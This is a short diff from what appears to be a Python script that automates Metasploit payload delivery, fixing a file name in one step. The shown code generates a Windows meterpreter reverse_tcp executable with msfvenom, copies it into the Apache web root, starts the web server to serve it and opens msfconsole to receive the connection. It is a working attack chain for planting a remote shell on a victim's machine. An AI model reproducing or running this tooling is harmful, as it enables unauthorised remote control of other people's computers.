@@ -68,7 +68,7 @@ if sys == str("windows"):
     os.system("clear")
     os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + por + " -f exe -o " + nom + ".exe")
     os.system("clear")
-    os.system("mv " + nom + " /var/www/html")
+    os.system("mv " + nom + ".exe " + " /var/www/html")
     os.system("service apache2 start")
     os.system("msfconsole")
 if sys == str("android"):
